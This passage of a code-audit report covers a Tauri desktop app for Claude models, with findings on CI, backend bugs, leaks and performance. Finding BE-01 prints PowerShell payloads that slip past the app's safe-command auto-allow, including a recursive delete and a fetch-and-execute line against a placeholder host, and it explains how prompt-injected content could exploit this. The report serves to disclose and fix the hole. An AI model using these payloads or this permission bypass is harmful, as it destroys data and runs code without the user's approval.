- Düzeltme ipucu: Set rust-version = "1.91" (raise it again when moving to rusqlite 0.41, which needs 1.89 and is already covered).

### QA-13 — `npm run build` fails without the signing key; the local release build must use its own target dir

- Önem: **low**, efor: **S**
- Dosyalar: `package.json`, `README.md`
- Kanıt: package.json:10 has "build": "tauri build". With tauri.conf.json:56 createUpdaterArtifacts: true, that build needs TAURI_SIGNING_PRIVATE_KEY (README:208 says so), so the obvious script fails at the end. The correct unsigned command, which build.yml uses, is `npx tauri build --config src-tauri/tauri.no-updater.conf.json` run from the repo root. `cargo tauri` is not installed here ('no such command: tauri'); `npx tauri --version` is 2.12.6. The owner's app is running from D:\ClaudeRust\target\release\clauderust.exe (PID 13716). A local release build into the default target dir would fail to overwrite that locked exe, or would replace the owner's copy.
- Düzeltme ipucu: Change the script to "build": "tauri build --config src-tauri/tauri.no-updater.conf.json" (keep a "build:signed" for releases). For automated local release builds, set CARGO_TARGET_DIR=D:\ClaudeRust\target-build (.gitignore already ignores /target-*/) and collect the bundles from target-build/release/bundle/{msi,nsis}.

### QA-14 — Tests call std::env::set_var while other test threads run

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/anthropic.rs`, `src-tauri/src/filesearch.rs`, `src-tauri/src/mcp.rs`, `src-tauri/src/oai.rs`
- Kanıt: std::env::set_var("NO_PROXY", "127.0.0.1") runs inside tests at anthropic.rs:707, filesearch.rs:547, mcp.rs:1607 and oai.rs:274 and 289. The harness runs tests on parallel threads (CI uses --test-threads=2) that read the environment (reqwest system-proxy lookup, Command::spawn). Concurrent setenv/getenv is undefined behaviour on glibc and is `unsafe` in edition 2024, so it can cause rare flaky crashes on Linux CI.
- Düzeltme ipucu: Build the test HTTP clients with reqwest::ClientBuilder::no_proxy() (or pass a no-proxy flag into the client constructor) and delete the set_var calls.

### QA-15 — CI/release hygiene: floating action tag in the signing job, no concurrency cancel, redundant parse step, no fmt or audit gate

- Önem: **low**, efor: **S**
- Dosyalar: `.github/workflows/ci.yml`, `.github/workflows/build.yml`, `.github/workflows/release.yml`
- Kanıt: release.yml:96 uses tauri-apps/tauri-action@v0, a moving tag, in the job that receives TAURI_SIGNING_PRIVATE_KEY. checkout/setup-node/upload-artifact are pinned at @v4. ci.yml and build.yml have no `concurrency:` group, and build.yml runs 3 full LTO release builds on every push to every branch (8-12 min each per `gh run list`). ci.yml:35-37 runs `node --experimental-default-type=module --check`, which duplicates the ESLint parse in the next step. There is no rustfmt.toml and no fmt step: `cargo fmt --check` reports 1390 diff hunks (454 even with max_width=200,use_small_heuristics=Max). CI has no cargo audit (see QA-05). The last CI and Build runs on main are green.
- Düzeltme ipucu: Pin tauri-action (and ideally all actions) to a commit SHA. Add `concurrency: { group: ${{ github.workflow }}-${{ github.ref }}, cancel-in-progress: true }` to ci.yml and build.yml, and limit build.yml to main plus workflow_dispatch. Drop the node --check loop. Either commit a rustfmt.toml that matches the house style and gate on `cargo fmt --check`, or state that formatting is not enforced.

### QA-16 — Four Tauri commands are registered but never called from the UI

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/commands.rs`, `src-tauri/src/lib.rs`
- Kanıt: I compared the 156 distinct call('...') names in ui/js with the 162 entries in generate_handler! (lib.rs:349). Every UI call is registered. Never invoked: delete_artifact (commands.rs:1090), code_info (commands.rs:1329), term_list (commands.rs:1578), worktree_commit (commands.rs:1837), and dev_report (debug-only). That is dead IPC surface to maintain and to audit.
- Düzeltme ipucu: Remove these commands, or wire them up. delete_artifact in particular may be meant for the artifact panel.

### QA-17 — CSP img-src is wider than the app needs

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/tauri.conf.json`
- Kanıt: tauri.conf.json:27 allows img-src `asset: http://asset.localhost https:`. The asset protocol is not enabled: no protocol-asset feature in Cargo.toml and no convertFileSrc or asset:// use in ui/js. Markdown images are rewritten into links (markdown.rs:308-323), tool-result images are always data: URIs (render.rs:272-280), and search favicons are letters (parts.js:356-358). The `https:` source only serves as a beacon channel if HTML injection ever occurs.
- Düzeltme ipucu: Change the img-src part to `img-src 'self' data: blob:`, then check that the attachment previews (chat.js:412, composer.js:173) still load, since they use data: or blob: URLs.

## Backend / Stabilite

Ölçümler: cargo clippy -p clauderust --lib -- -D warnings: exit 0, no warnings. cargo test -p clauderust --lib on Windows: 182 passed, 6 failed, 10 ignored; the 6 failures are environmental (see BE-04). Non-test unwrap/expect: 48, triaged. 33 are static Regex::new in LazyLock; 5 are stdio pipe take() right after a piped spawn; 4 are last_mut/as_array_mut/unwrap guarded by a prior check (render.rs:420, import.rs:341/400, engine.rs:1126/1546); 2 are http Response builders with constant headers (lib.rs:191/196); 1 is the startup expect (lib.rs:515). None can be reached by user or network data, so I found 0 panic sites. I checked range slicing (~90 sites) and every string slice is char-boundary safe (find() results, is_char_boundary loops, ASCII hex ids). Locks held across .await: none (clippy await_holding_lock is clean, and Tauri async commands require Send). Lock order is consistent (settings→db, subagents.map→spent, shells.map→exit), so I found no deadlock. SQL is fully parameterized; FTS and LIKE inputs are escaped. Events: every emitted event has a UI listener. Commands: every UI call is registered, and 4 registered commands are unused. Turn end is clean on stream drop, MCP drop and panic: runs, live and pending_perms are cleared and generation-state is emitted (engine.rs:726-749). BE-01 was confirmed with a probe linked against the built rlib plus a live PowerShell run; BE-02 with live PowerShell and node spawn runs.

Kontrol edilmeyenler: UI JavaScript beyond what the IPC/attachment findings needed; artifact iframe/CSP security; the Linux/macOS-only code paths (not compiled or run here); the release build and installer; the running app (I neither started it nor touched the release process); profiling of real RAM and CPU; deep review of gitops.rs, worktree.rs, pullrequest.rs, render.rs, markdown.rs, oai.rs, updates.rs, view.rs; correctness of the import parsers; end-to-end behaviour with a real `claude` CLI and with real Python MCP servers (Python is not installed). BE-03 (CRLF Edit) is evidenced by reading the code, not by running the tool. ESLint was not run (UI is not my area).

### BE-01 — Windows: the 'safe command' auto-allow can be bypassed with PowerShell subexpressions, so any command runs without asking, even in plan mode

- Önem: **critical**, efor: **S**
- Dosyalar: `src-tauri/src/codetools.rs`
- Kanıt: On Windows the Bash tool runs `powershell -NoProfile -NonInteractive -Command <script>` (codetools.rs:902-911). The safety check uses POSIX word splitting: split_simple_commands (codetools.rs:478-505) only rejects `$(`, backtick, `<(`, `>(`, `${`, `$'`, `>`, `<`, `&`, and args_inside (539-548) treats an arg as a path only if it starts with '/', contains '..' or (Windows) contains ':'. PowerShell evaluates `(...)` in arguments, so `echo (Remove-Item -Recurse -Force src)` passes because `echo` is in SAFE_CMDS (468-471). I linked a probe against target/debug/deps/libclauderust_lib-04eb4b4c0a179c9b.rlib (codetools.rs has not changed since that build) and it printed `echo (Remove-Item -Recurse -Force src) safe=true` and `cat (Invoke-Expression (Invoke-WebRequest -UseBasicParsing http://example.invalid/x).Content) safe=true`, while `rm -rf src` gave safe=false. Running `powershell -Command "echo (New-Item -ItemType File -Force -Path <scratch>\pwned.txt).Name"` created the file, so PowerShell does run the inner command. check_permission returns Allow for safe commands before it checks plan mode (codetools.rs:691-698), so this works in default, plan and explore-sub-agent modes. A prompt-injected file or web page can therefore run arbitrary code with no permission card.
- Düzeltme ipucu: Under cfg(windows), or whenever the shell is PowerShell, make split_simple_commands return None when the command contains any of ( ) @ { } $ , ; or a backtick, or simply never auto-allow there. Move the plan-mode Deny ahead of the safe-command Allow, or only allow safe commands in plan mode after they pass a stricter check. Add tests with these payloads.

### BE-02 — Windows: the 'Bash' tool and hooks actually run Windows PowerShell 5.1, unannounced, so bash syntax fails and cd never persists

- Önem: **high**, efor: **L**
- Dosyalar: `src-tauri/src/codetools.rs`, `src-tauri/src/hooks.rs`, `src-tauri/src/prompts.rs`
- Kanıt: The tool's description says "Run a shell command... The working directory persists between calls" (codetools.rs:143-144), but on Windows shell_command builds `powershell -Command` and returns pwd_file=None (codetools.rs:902-911). bash() therefore never updates s.cwd (1044-1052), and a `cd` is lost on the next call. Nothing tells the model the shell is PowerShell: the prompt only says `Platform: windows` (codetools.rs:1594-1600), and grep -i powershell in prompts.rs finds nothing. Verified on this machine: `powershell -Command "echo a && echo b"` gives "The token '&&' is not a valid statement separator in this version", and `ls -la 2>/dev/null` fails with DirectoryNotFound 'D:\dev\null'. Hooks go through the same shell_command (hooks.rs:225). A Claude Code-format hook such as the user's own `"C:/Program Files/nodejs/node.exe" "C:/Users/.../obsidian-log.js"` fails to parse. Reproduced via node spawn: `"C:/Windows/System32/whoami.exe" "/?"` gave ParserError 'Unexpected token'.
- Düzeltme ipucu: Do what Claude Code does on Windows: use Git Bash when it is installed (find bash.exe next to git, honour CLAUDE_CODE_GIT_BASH_PATH) and keep the existing bash script with pwd tracking. Fall back to PowerShell only when bash is missing, and then rename or describe the tool as PowerShell in its definition and the system prompt, emulate cd tracking (append `(Get-Location).Path | Out-File $env:CR_PWD_FILE`), and run hooks through bash or prefix them with `&`.

### BE-03 — Built-in Edit/Write break on CRLF and non-UTF-8 files (multi-line edits never match; line endings get mixed)

- Önem: **high**, efor: **M**
- Dosyalar: `src-tauri/src/codetools.rs`
- Kanıt: Read strips '\r' from every line it shows the model (codetools.rs:1152: `line.trim_end_matches('\r')`). edit() then reads the raw file and matches old_string literally: `std::fs::read_to_string(&path)?` and `text.matches(old)`, then `text.replacen(old, new, 1)` (codetools.rs:1228-1239). grep for \r\n or crlf in codetools.rs finds nothing else. So any multi-line old_string copied from Read output (LF) never matches a CRLF file, which is the default checkout on Windows with core.autocrlf=true, and returns "String to replace not found". When a match does happen, LF text is spliced into a CRLF file. write() (1192) writes the model's LF content over a CRLF file, which turns the whole file into a diff. A non-UTF-8 file (Latin-1, UTF-16) fails in read_to_string even though Read shows it lossily. util::decode_text and encode_text already exist (util.rs:256-270, used by memory.rs).
- Düzeltme ipucu: In edit(): decode with util::decode_text. If the file uses CRLF and old_string doesn't match as given, convert old/new '\n' to '\r\n' and match again. Write back with util::encode_text in the original encoding. In write(): keep the existing file's line-ending style and encoding. Add a CRLF test.

### BE-04 — `cargo test` fails on Windows: 6 tests are not hermetic (they read the user's ~/.claude and are fooled by the python3 Store stub)

- Önem: **medium**, efor: **S**
- Dosyalar: `src-tauri/src/hooks.rs`, `src-tauri/src/mcp.rs`
- Kanıt: `cargo test -p clauderust --lib` here: "test result: FAILED. 182 passed; 6 failed; 10 ignored". (1) hooks::tests::settings_with_a_bom_count_and_broken_ones_are_reported panics at hooks.rs:379 with left=`"C:/Program Files/nodejs/node.exe" "C:/Users/xldyt/.claude/hooks/obsidian-log.js"`, right=`echo done`. hooks::load always merges dirs::home_dir()/.claude/settings.json (hooks.rs:133-135), so the developer's real hooks leak into the test. (2) Five MCP tests (stdio_roundtrip, output_that_isnt_utf8, a_server_that_exits, a_stopped_call, clashing_names) guard with `which::which("python3").is_err()` (mcp.rs:1422,1471,1495,1517,1560,1579), but `which -a python3` resolves to WindowsApps\python3.exe, the AppInstallerPythonRedirector stub. The servers then fail with "Python was not found; run without arguments to install from the Microsoft Store". clippy -D warnings is clean (exit 0).
- Düzeltme ipucu: Give hooks::load a home path argument, or an env override that tests set to a temp dir. In the MCP tests, check that `python3 -c "print(1)"` actually succeeds before running them instead of using which().

### BE-05 — No logger and no panic hook: every log::warn/error and every panic in the release app vanishes

- Önem: **medium**, efor: **S**
- Dosyalar: `src-tauri/src/lib.rs`, `src-tauri/src/main.rs`, `src-tauri/Cargo.toml`, `src-tauri/src/engine.rs`
- Kanıt: Cargo.toml depends on `log = "0.4"` only. grep finds no env_logger, simplelog, tauri_plugin_log, set_logger or panic::set_hook anywhere in src-tauri. The code makes 26 log::warn!/error!/info! calls (checkpoint failures, worktree removal failures, 'generation failed', MCP problems), and they all go to the no-op logger. The release binary has windows_subsystem="windows" (main.rs:2), so there is no stderr either. A caught turn panic is turned into the generic "Something went wrong while generating this response." (engine.rs:731) with nothing recorded, so a user cannot send a crash report.
- Düzeltme ipucu: Install a small file logger in data_dir/logs with size rotation (tauri-plugin-log, or a 30-line log::Log impl) at the start of setup(). Add std::panic::set_hook that writes the panic message, location and backtrace to the log. Expose 'Open logs folder' in /doctor.

### BE-06 — Staged attachments leak in AppState.staged when the composer is dropped without sending; the workflows map is not cleared on delete

- Önem: **medium**, efor: **S**
- Dosyalar: `src-tauri/src/commands.rs`, `src-tauri/src/state.rs`, `ui/js/composer.js`, `ui/js/chat.js`
- Kanıt: Attachments are inserted into st.staged at commands.rs:847, 863 and 879 and removed only when sent (485, 623) or on explicit unstage (885). The UI calls unstage only from a chip's x button (composer.js:178, 217). A new composer is created on every chat open (chat.js:90 createComposer) with a fresh `let attachments = []` (composer.js:47), and nothing unstages the old one's. Every attachment left behind when you navigate away stays in memory until exit: an image up to 3.7 MB base64, a PDF up to 32 MB raw (~43 MB base64), text digests (attachments.rs:12-15). There is no TTL or cap. Separately, delete_conversation (commands.rs:721-776) never removes st.workflows[conv] (written at claudecode.rs:1152).
- Düzeltme ipucu: Unstage the composer's attachments when it is torn down, and in the backend evict staged entries older than about an hour or above a total byte cap. Remove st.workflows (and any cc_ctl entry) in delete_conversation.

### BE-07 — Code sessions keep every edited file's original bytes, and finished background shells keep 1 MB buffers, for the whole app lifetime

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/codetools.rs`, `src-tauri/src/state.rs`, `src-tauri/src/shells.rs`, `src-tauri/src/commands.rs`
- Kanıt: write() and edit() always call remember_original (codetools.rs:1191, 1212, 1240), which keeps the full file content, up to MAX_ORIGINAL_BYTES = 20 MB per file (51, 66-82), in CodeSession.originals. This also happens in git repos, where gitops diffs against HEAD and the originals are not needed. AppState::code_session inserts a session for every conversation touched (state.rs:106-111). Entries are removed only by delete_conversation or discard (commands.rs:726, 435), never when a turn ends or a session goes idle. Background shells keep up to OUTPUT_CAP = 1_000_000 bytes each (shells.rs:23). Finished ones are dropped only by the manual 'clear finished' (shells.rs:224-228) or by deleting the conversation. A long agent day editing large files and starting many test or dev runs grows RSS without bound, which works against the low-RAM goal.
- Düzeltme ipucu: Record originals only for non-git sessions, or cap the total bytes per session. Evict code_sessions that have had no run for N minutes; they are cheap to recreate. Auto-drop finished shells after some time or beyond the last N per conversation.

### BE-08 — Checkpoint shadow repos grow forever: one commit per code turn, never pruned, not removed with their sessions

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/checkpoints.rs`, `src-tauri/src/engine.rs`, `src-tauri/src/commands.rs`
- Kanıt: checkpoint_turn runs before every code turn (engine.rs:831-869) and calls snapshot_locked, which runs `git add -A` plus `git commit --allow-empty` into data_dir/checkpoints/<hash> (checkpoints.rs:121-127). Every commit stays reachable from HEAD and nothing ever prunes, gcs, expires or deletes the repo. The only other references are restore and changed_since, and the size readout in /doctor (commands.rs:2138). delete_conversation does not touch it. With suitable() allowing projects up to 1.5 GB and 40k files (checkpoints.rs:106), changed binaries and data files pile up in the app data folder indefinitely. suitable() also walks the whole tree on every turn.
- Düzeltme ipucu: Prune after a snapshot: keep the last N snapshots or the last 30 days, re-point HEAD with `git replace`, or run `git reflog expire` plus `git gc --prune=now` periodically. Delete the shadow repo when no conversation uses the folder. Cache the suitable() result per folder for a few minutes.

### BE-09 — Chats that run on the Claude account (CLI chat engine) silently drop project PDFs and images

- Önem: **medium**, efor: **S**
- Dosyalar: `src-tauri/src/claudecode.rs`, `src-tauri/src/engine.rs`
- Kanıt: build_request_context puts non-text project files (PDFs, images) into rc.prefix_blocks (engine.rs:122-134). build_messages adds them to the first user message for the API engine (engine.rs:420-424). The CLI chat path calls build_request_context but uses only rc.system, written to system-<conv>.txt (claudecode.rs:798-807). prefix_blocks is never referenced in claudecode.rs (grep), and the first stream-json line carries only the user's own content (claudecode.rs:866-887). A project's PDF knowledge is ignored with no warning when chat_engine is 'claude-code', or 'auto' without an API key (claudecode.rs:237-243), which is the default for subscription users.
- Düzeltme ipucu: On the first turn of a CLI session (no --resume), or every turn when with_history, prepend rc.prefix_blocks to `content` (stream-json accepts document and image blocks). Otherwise show a notice that binary project files are not used.

### BE-10 — MCP: a crashed stdio server is neither reported nor restarted, and tools/list_changed notifications are ignored

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/mcp.rs`, `src-tauri/src/commands.rs`
- Kanıt: When a server process exits, the stdout reader task only sets state=("failed", why) and clears pending (mcp.rs:1158-1171). No `mcp-changed` event or notice is emitted (mcp-changed is emitted only from commands.rs and lib.rs after a (re)start). There is no restart or backoff: later calls fail with "... is not running. Reload it in Settings → Developer" (mcp.rs:347-350). Its tools silently disappear from the next request (tools() filters on "connected", mcp.rs:855-862). handle_stdout_line returns early for every message that has a method and no id (mcp.rs:1038-1052), so `notifications/tools/list_changed` from a server never triggers refresh_tools and new or removed tools are missed until a manual reload. HTTP servers have no notification channel at all.
- Düzeltme ipucu: When the reader exits, emit `mcp-changed` and a notice naming the server, and optionally restart it with exponential backoff (max 3 tries) through the manager. Route list_changed (and resources/prompts list_changed) to refresh_tools via a channel back to the McpServer, then emit `mcp-changed`.

### BE-11 — change_revert can delete any file on disk: abs_in accepts absolute paths outside the repo

- Önem: **medium**, efor: **S**
- Dosyalar: `src-tauri/src/gitops.rs`, `src-tauri/src/commands.rs`
- Kanıt: abs_in (gitops.rs:301-307) only rejects '..' components. An absolute `rel` is returned unchanged (`if p.is_absolute() { p.to_path_buf() }`). revert_file then takes the not-in-HEAD branch for such a path (`git cat-file -e HEAD:<abs>` fails), runs `git rm --cached` with the result ignored, and calls `std::fs::remove_file(&full)` if it is a file (gitops.rs:518-533). change_revert passes the UI's `paths: Vec<String>` straight through (commands.rs:1612-1620), so a stray absolute path, or a bug or XSS in the webview, deletes files outside the project with no further check. The non-git branch has the same containment gap (537).
- Düzeltme ipucu: In abs_in, canonicalize the nearest existing ancestor (codetools::canonical_or_self) and require it to start with the canonical root. Reject absolute paths that are not under root. Add a test that `/etc/hosts` and `C:\x` are refused.

### BE-12 — CLI chats leave the full system prompt (project instructions and knowledge) on disk forever, even after the chat is deleted

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/claudecode.rs`, `src-tauri/src/commands.rs`
- Kanıt: Every CLI chat turn writes rc.system, which contains project instructions and text knowledge files and can be megabytes, to data_dir/chat-cli/system-<conv_id>.txt (claudecode.rs:221-225, 799-801). Nothing deletes these files (grep for system-/chat_dir finds only those lines), and delete_conversation (commands.rs:721-776) does not remove them. Deleted conversations' private context stays on disk, and the folder grows with every chat.
- Düzeltme ipucu: Remove the file in delete_conversation and discard_new_conversation. Or write it as a per-turn temp file and delete it once the CLI has exited (after stop_cli).

### BE-13 — Fork is not transactional: a failure mid-copy leaves a partial, untitled conversation

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/db.rs`, `src-tauri/src/commands.rs`
- Kanıt: fork_into_new creates the conversation (commands.rs:3272), then copy_path inserts each message with a separate msg_insert, each taking the lock and committing on its own (db.rs:690-712), then sets the title (3278). An error part-way (disk full, a locked DB, a crash) leaves a conversation holding a prefix of the branch and no '(fork)' title, and nothing cleans it up. The same pattern of no transaction applies to conv_delete's two statements (db.rs:594-602), which is harmless there.
- Düzeltme ipucu: Run conv_create, all inserts, set_leaf and title in one `conn.unchecked_transaction()`. This also makes long forks much faster.

### BE-14 — A stalled API stream (dead TCP connection, no RST) hangs the turn for 10 minutes before erroring

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/anthropic.rs`
- Kanıt: The client uses `.read_timeout(Duration::from_secs(600))` (anthropic.rs:72, 780), and stream() has no idle watchdog of its own (anthropic.rs:201-236). The API sends `ping` events every few seconds, so a silent socket after a network switch or sleep means the turn shows 'responding' for up to 10 minutes. Stop works, but there is no automatic failure with Retry.
- Düzeltme ipucu: Lower the streaming read timeout to about 60-90 s, or wrap stream.next() in tokio::time::timeout with an idle limit, and report 'The connection stalled' so the existing Retry path applies.

### BE-15 — Terminal pane: unbounded channel between PTY reader and UI pump, so a fast producer grows memory without limit

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/terminal.rs`
- Kanıt: The reader thread pushes every 8 KB read into `std::sync::mpsc::channel::<Vec<u8>>()`, which is unbounded (terminal.rs:157-170). pump_output drains it at the pace of app.emit (64 KB per event, terminal.rs:82-110). The comment says batching keeps a flood (`yes`, `cat` of a big file) from swamping the window, but when the producer outruns event delivery the queue simply grows in RAM with no backpressure.
- Düzeltme ipucu: Use sync_channel with a small bound (e.g. 64) so the reader blocks and the PTY applies backpressure to the program, or drop old chunks past a byte cap.

### BE-16 — Project files (full base64) are re-read from SQLite and re-hashed on every tool step of a chat turn, on the async runtime

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/engine.rs`, `src-tauri/src/db.rs`
- Kanıt: run() calls build_request_context inside its per-step loop (engine.rs:974-985). For project chats that loads every project file with its data column (`SELECT * FROM project_files`, db.rs:970-977; engine.rs:118-134), clones the binary ones into prefix_blocks, then serializes them and SHA-256s them into the fingerprint (engine.rs:174-179). This is synchronous DB and CPU work on a tokio worker, repeated on each tool round and each overload fallback, and can be tens of MB per step for a project with PDFs.
- Düzeltme ipucu: Build the project part once per turn, outside the loop, and reuse it. Fingerprint project files by id, size and created_at instead of hashing their bytes. Use spawn_blocking for the read.

### BE-17 — Whole-file reads before size checks: archmap and claude.ai import can load huge inputs into memory

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/archmap.rs`, `src-tauri/src/import.rs`
- Kanıt: archmap reads the whole file and only then skips it if it is large: `let Ok(text) = std::fs::read_to_string(root.join(f)) else {continue}; if text.len() > 1_000_000 { continue; }` (archmap.rs:87-90). A checked-in 300 MB generated .js or .ts file is loaded in full on every Map refresh. The import accepts a conversations.json of up to MAX_EXPORT_ENTRY_BYTES = 1 GB (import.rs:487-504) and parses it whole into serde_json::Value, several times its size in RAM. load_export likewise reads folders whole (import.rs:524).
- Düzeltme ipucu: archmap: check metadata().len() before reading, as symbols.rs:112 does. Import: stream the top-level array with serde_json's Deserializer and a SeqAccess visitor, importing conversation by conversation.

### BE-18 — Dead IPC surface: 4 registered commands are never called, so PTYs are orphaned after a webview reload

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/src/lib.rs`, `src-tauri/src/commands.rs`, `ui/js/panes/terminal.js`
- Kanıt: I compared generate_handler! in lib.rs:349-511 with every call()/invoke() in ui/js. Registered but never called: code_info (commands.rs:1329), delete_artifact (1090), term_list (1578), worktree_commit (1837). Nothing is called that isn't registered, and every Rust-emitted event has a UI listener. Without term_list the Terminal pane cannot reattach after the page reloads (Settings → Restore reloads it). It opens new shells (terminal.js:41), and the old PTYs keep running until the conversation is deleted or the app exits.
- Düzeltme ipucu: Either remove the four commands or wire them up. For the terminal, call term_list on mount and reattach to (or close) the existing PTYs.

## Performans

Ölçümler: Running release copy (pid 13716, D:\ClaudeRust\target\release\clauderust.exe, near-empty DB of 0 MB plus a 0.14 MB WAL, idle). Main process: 74.4 MB WS / 14.4 MB private, 14 threads, 695 handles. WebView2 children: browser 98.6 / 36.9, GPU 69.9 / 79.1, renderer 62.9 / 38.0, network 43.5 / 11.9, storage 23.6 / 7.8, crashpad 16.9 / 3.0 (MB WS / MB private). Tree total: 389.6-390.8 MB WS, 191.1-191.5 MB private. Idle CPU: 0 ms over 10 s across all 7 processes.

Claude Desktop 6.18355 (13 processes under WindowsApps\Claude_*): 2,038 MB WS / 1,971 MB private. It was in active use hosting this session (its main renderer alone is 781.8 MB), so this is not an idle-to-idle comparison. Its Claude Code CLI processes add 397-454 MB WS each. Install sizes: Claude Desktop 760.2 MB, its bundled claude-code exe 362 MB.

ClaudeRust sizes: clauderust.exe 24.91 MB (pdb 5.28 MB), NSIS installer 7.75 MB, MSI 10.41 MB.

Synthetic DB with the repo schema (3,000 conversations, 98,968 messages, 268.5 MB, SQLite 3.50.4 via Python; script dbbench.py in the scratchpad):
- mark_interrupted at startup: 139 ms
- conv_list: 4.0 ms
- tree_nodes for 3,000 messages: 11.4 ms
- path_to for 3,000 messages: 40.4 ms
- prompt_history: 305 ms
- assistant_usage_since: 125 ms
- conversations_editing: 199 ms
- imported_keys: 130 ms
- FTS delete by message_id: 97 ms
- FTS search: 94-119 ms for common prefixes, 1.4 ms for a rare one
- title LIKE search: 0.1 ms

Release benches (built in a scratch target, no LTO, codegen-units 16):
- bench_live_ticks, 40 rounds: render 342 us/tick, emit 469 us/tick
- bench_conversation_view, 300 messages: 1.06 s cold, 11.5 ms warm
- 12 MP JPEG attachment: 424 ms
- turnstream measure, 40 rounds: full stream 1,012.5 MB vs compact 66.0 MB (6.5%), last full turn 466 KB, median delta 1.4 KB

Scratch crate against clauderust_lib:
- Claude Code-style emit: 0.8-1.3 ms/tick with small outputs; 2.1 / 5.3 / 11.6 ms/tick at 10 / 40 / 100 rounds with 85 KB outputs, full turn 0.57 / 2.0 / 4.9 MB
- View payload: 15.5 MB for 300 messages; 103 MB for 2,000 messages (5.5 s cold, 6.4 s warm)
- 4 photos: 19.3 MB view payload
- 200-line code block: 13 KB source becomes 276 KB HTML (Rust), 322 KB (TypeScript), 479 KB (Python), about 35 spans per line
- First highlight per language: 0.6-81 ms; a 200-line TypeScript block cold: 230 ms
- Parsing a stored 32 MB PDF message (44 MB of JSON): 7.5 ms

Other:
- cargo tree -d: reqwest 0.12.28 and 0.13.5, html5ever 0.31 and 0.39
- UI: 51 of 53 modules (530 KB) are statically imported at start

Scratch files: C:\Users\xldyt\AppData\Local\Temp\claude\b19ddb4b09d05f83\747baec6-ad7e-4440-baa9-57ceec9c11a3\scratchpad\dbbench.py, ...\scratchpad\bench.db, ...\scratchpad\ccbench\src\main.rs. The 2.3 GB scratch build directory was deleted.

Kontrol edilmeyenler: - Real app startup time to first paint: I could not launch a second instance without the single-instance plugin focusing the owner's running copy, so I measured startup components only.
- WebView renderer memory and DOM time with a long conversation loaded: the DOM cost is inferred from payload size and span counts, not measured in a WebView.
- Real per-turn latency of the Claude Code CLI: no real turn was sent.
- GPU and animation CPU while streaming.
- The owner's real database is empty, so all DB numbers are synthetic.
- Effect of LTO: the benches were built without LTO and with codegen-units 16, so shipped numbers may be 5-15% better.
- MCP servers with real configs.
- Linux and macOS.
- cargo clippy and cargo test across the whole crate (other auditors' area; only the ignored benches were run).
- Network-bound paths (get_models on start, update checks).

### PERF-01 — Highlighted code HTML is 21-37x the source size (about 35 nested scope spans per line), which bloats every payload, the DOM and the render caches

- Önem: **high**, efor: **M**
- Dosyalar: `src-tauri/src/highlight.rs`, `src-tauri/src/markdown.rs`
- Kanıt: highlight.rs:18 sets `STYLE = ClassStyle::SpacedPrefixed { prefix: "hl-" }` and lines 135/152 pass it to `line_tokens_to_classed_spans`. Every scope push becomes a nested span carrying every atom as a class, for example `<span class="hl-meta hl-group hl-rust"><span class="hl-punctuation hl-section hl-group hl-begin hl-rust">(`. Measured with the repo's own markdown::render in a release build (scratch crate): a 200-line code block of 13 KB becomes 276 KB of HTML for Rust (21x, 4,202 spans), 322 KB for TypeScript (25x) and 479 KB for Python (37x). In the view fixture, one 80-byte line becomes 2,278 bytes with 35 spans. Knock-on effects: (a) while a reply streams, the changed text part is re-sent whole in every delta (turnstream.rs:107-110, 220-226), so a 200-line block is about 300-480 KB per 45 ms tick; (b) the 32 MB markdown cache (markdown.rs:16-18) holds only about 320 answers with a 40-line block, at about 101 KB of HTML each, so long conversations thrash it (see PERF-02).
- Düzeltme ipucu: Emit flat token spans in place of the scope tree. Map each token's scope stack to one short class from a small table (keyword, string, comment, number, function, type, punctuation, and so on), drop the meta.*/source.* scopes and the language-suffix atoms, and merge adjacent tokens of the same class. Generate the CSS for those classes in theme_css (highlight.rs:237). Keep the resumable `Progress` logic by doing the mapping per line.

### PERF-02 — Opening a conversation and every turn end re-render and ship the whole conversation with no windowing; long sessions cost seconds and hundreds of MB

- Önem: **high**, efor: **L**
- Dosyalar: `src-tauri/src/view.rs`, `src-tauri/src/render.rs`, `src-tauri/src/commands.rs`, `ui/js/chat.js`, `ui/js/main.js`
- Kanıt: view.rs:103-151 calls render::build_turns over the full current path and returns every turn. chat.js:62 and :112 insert all of them into the DOM. reload() fetches everything again at least twice per turn: chat.js:286 after send_message and chat.js:828 on generation-state. main.js:272-273 reopens the last chat at every launch. Measured (release, no LTO) on the commands.rs long_session shape, a 40-line Rust block per answer: 300 messages take 1.06 s cold and 5-11.5 ms warm (existing bench_conversation_view, plus the scratch crate), with a 15.5 MB JSON payload. 2,000 messages take 5.5 s cold and 6.4 s warm, with a 103 MB payload. Warm is not faster because the 32 MB markdown cache has been evicted. A first highlight of a 200-line TypeScript block costs 230 ms. This fixture is code-heavy, so prose-heavy chats cost less.
- Düzeltme ipucu: Make get_conversation return the last N turns (around 30) plus a cursor, and load earlier turns when the user scrolls up (chat.js onScroll). At turn end, ask only for turns from the first changed turn id and leave the rest of the view untouched. After PERF-01 the caches will also cover far more turns.

### PERF-03 — Full-resolution base64 images go inline into every conversation view payload as data URLs

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/render.rs`, `src-tauri/src/attachments.rs`, `src-tauri/src/lib.rs`, `ui/js/chat.js`
- Kanıt: commands.rs:464 stores attachments as base64 blocks inside the message content (attachments.rs:309-319, images up to MAX_IMAGE_BYTES 3.7 MB). render.rs:362-386 (user_parts) copies each image into a `data:...;base64,` string and puts it in `src`. render.rs:272-280 does the same for images in tool results. Measured: a chat with 4 photos at the limit produces a 19.3 MB build_turns payload, and that payload is fetched at least twice per turn (PERF-02). A 240-px JPEG preview is already made (attachments.rs:124-131) and stored in meta.attachments[].preview (attachments.rs:329-331), but the view does not use it.
- Düzeltme ipucu: In user_parts, use meta.attachments[i].preview as `src`. Serve the full image on demand through a custom URI scheme keyed by message id and block index (same pattern as the artifact protocol in lib.rs:179-198), and use that for the lightbox (chat.js attachmentsHtml).

